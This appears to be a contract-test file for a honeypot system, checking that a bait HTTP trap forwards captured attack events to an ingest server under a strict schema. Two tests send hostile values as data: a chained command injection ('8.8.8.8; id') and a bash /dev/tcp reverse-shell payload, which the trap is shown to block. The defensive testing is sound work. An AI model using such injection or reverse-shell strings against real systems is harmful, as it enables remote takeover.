// Contract tests across C's boundaries, based on contracts.md.
//
// UPSTREAM (A -> C): the real trap (apps/trap/server.mjs) posts to the real
// ingest server (apps/control/ingest.mjs). No database — insert is captured in
// memory. If A's event shape broke C's strict schema, C would 400 and the trap
// would 503, so "trap got its planned status AND C captured a valid row" is a
// true wire-contract check.
//
// DOWNSTREAM (C -> B / D / E): B, D, E are not on main yet. The shape C offers
// them is checked here; the consumer side is marked todo (pending) until they
// land, per "mark pending, test what is available".
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import path from 'node:path';
import { createTrap } from '../apps/trap/server.mjs';
import { createIngestServer } from '../apps/control/ingest.mjs';
import { ShellTurn, StoredEvent } from '../packages/events/schema.ts';

const dir = path.dirname(fileURLToPath(import.meta.url));
const MAP = JSON.parse(readFileSync(path.join(dir, '..', 'packages', 'trap', 'response-map.json'), 'utf8'));
const ADMIN_TOKEN = JSON.parse(MAP['GET /api/env'].body).ADMIN_TOKEN;
const SID = '00000000-0000-4000-8000-0000000000c1';
const INGEST_TOKEN = 'producer-tok';

const listen = (srv) => new Promise((r) => srv.listen(0, '127.0.0.1', () => r(srv.address().port)));

let ingest, trap, trapBase, captured;

before(async () => {
  captured = [];
  ingest = createIngestServer({ INGEST_TOKEN }, {
    // Validate exactly what C would store; record it.
    insert: async (rows) => { for (const r of rows) captured.push(StoredEvent.parse(r)); }
  });
  const ingestPort = await listen(ingest);
  trap = createTrap({
    DEMO_MODE: 'true',
    TRAP_INSTANCE_ID: 'contract-1',
    INGEST_TOKEN,
    INGEST_URL: `http://127.0.0.1:${ingestPort}/v1/events/batch`,
    CALLBACK_ALLOWLIST: '',   // nothing allowlisted -> reverse shell is blocked, never dialed
    REVSHELL_HOLD_MS: '0',    // don't hold the socket in the test
    BODY_LIMIT_BYTES: '16384'
  });
  trapBase = `http://127.0.0.1:${await listen(trap)}`;
});

after(() => { trap.close(); ingest.close(); });

const hit = (p, { method = 'GET', body, token } = {}) =>
  fetch(trapBase + p, {
    method,
    headers: {
      'x-demo-session': SID,
      'content-type': 'application/json',
      ...(token ? { authorization: `Bearer ${token}` } : {})
    },
    body
  });
const lastFor = (route, template) =>
  captured.find((e) => e.route === route && e.response_template === template);

// ---- UPSTREAM: A -> C -------------------------------------------------------

test('A->C: three bait routes are captured as valid StoredEvents', async () => {
  const login = await hit('/api/login', { method: 'POST', body: '{"user":"a","password":"hunter2"}' });
  const env = await hit('/api/env');
  const exec = await hit('/api/exec', { method: 'POST', body: '{"task":"demo-action"}' });
  assert.deepEqual([login.status, env.status, exec.status], [200, 200, 200],
    'non-200 from the trap would mean C rejected the event (400) and the trap 503d');

  for (const [route, template] of [
    ['/api/login', 'fake-admin-token'],
    ['/api/env', 'fake-env-values'],
    ['/api/exec', 'fake-command-success']
  ]) {
    const row = lastFor(route, template);
    assert.ok(row, `no captured event for ${route} (${template})`);
    StoredEvent.parse(row); // redundant but explicit: the wire contract holds
    assert.equal(row.session_id, SID, 'x-demo-session must propagate');
    assert.equal(row.source, 'trap_http', 'C stamps source');
    assert.ok(row.received_at, 'C stamps received_at');
    assert.equal(row.origin_label, 'synthetic_fixture');
  }
  assert.ok(!captured.some((e) => e.payload_text.includes('hunter2')), 'password stays redacted across the wire');
});

test('A->C: diagnostics ping + injection are captured', async () => {
  const ping = await hit('/api/admin/diagnostics', { method: 'POST', token: ADMIN_TOKEN, body: '{"host":"8.8.8.8"}' });
  assert.equal(ping.status, 200);
  assert.ok(lastFor('/api/admin/diagnostics', 'diag-ping'), 'diag-ping not captured');

  // Chained command -> diag-injected. The oneshot call 404s here (B absent),
  // which the trap tolerates; the event must still be captured.
  const inj = await hit('/api/admin/diagnostics', { method: 'POST', token: ADMIN_TOKEN, body: '{"host":"8.8.8.8; id"}' });
  assert.equal(inj.status, 200);
  assert.ok(lastFor('/api/admin/diagnostics', 'diag-injected'), 'diag-injected not captured');
});

test('A->C: unauthorized diagnostics is captured and returns 401', async () => {
  const res = await hit('/api/admin/diagnostics', { method: 'POST', token: 'wrong', body: '{"host":"x"}' });
  assert.equal(res.status, 401);
  const row = lastFor('/api/admin/diagnostics', 'diag-unauthorized');
  assert.ok(row, 'diag-unauthorized not captured');
  assert.equal(row.planned_status, 401);
});

test('A->C: blocked reverse-shell payload is captured, no outbound dial', async () => {
  const res = await hit('/api/admin/diagnostics', {
    method: 'POST', token: ADMIN_TOKEN,
    body: JSON.stringify({ host: 'x; bash -i >& /dev/tcp/203.0.113.9/4444 0>&1' })
  });
  assert.equal(res.status, 200);
  assert.ok(lastFor('/api/admin/diagnostics', 'revshell-blocked'), 'revshell-blocked not captured');
});

test('A->C: every captured response_template fits the schema bound (<=64 chars)', () => {
  assert.ok(captured.length > 0);
  assert.ok(captured.every((e) => e.response_template.length <= 64));
});

// ---- DOWNSTREAM: C -> B -----------------------------------------------------

test('C->B: a shell turn as B would build it satisfies insertShellTurn()', () => {
  // Shape from contracts.md §C1 (/v1/shell/cmd) + §C2. B omits received_at; C stamps it.
  const bTurn = {
    turn_id: '00000000-0000-4000-8000-0000000000b1',
    session_id: SID,
    seq: 0,
    command: 'id',
    output: 'uid=1000(node) gid=1000(node) groups=1000(node)\n',
    cwd: '/app',
    served_by: 'fast_path',
    latency_ms: 35
  };
  const parsed = ShellTurn.safeParse(bTurn);
  assert.equal(parsed.success, true, 'valid B turn (no origin_label/received_at) must pass');
  assert.equal(parsed.data.origin_label, 'live_demo', 'C defaults origin_label for B turns');
  assert.equal(ShellTurn.safeParse({ ...bTurn, served_by: 'shell' }).success, false, 'served_by must be fast_path|llm|filter');
  assert.equal(ShellTurn.safeParse({ ...bTurn, rogue: 1 }).success, false, 'unknown fields rejected');
});

// ---- DOWNSTREAM: C -> D / E (pending; consumers not on main yet) ------------

test('C->D: dashboard renders getTimeline/getTurns rows', { todo: 'workstream D not on main yet' });
test('C->E: guild agent consumes getTimeline rows as evidence', { todo: 'workstream E not on main yet' });
test('C->B: B\'s /v1/shell/* actually calls insertShellTurn with live turns', { todo: 'workstream B not on main yet; shape checked above' });
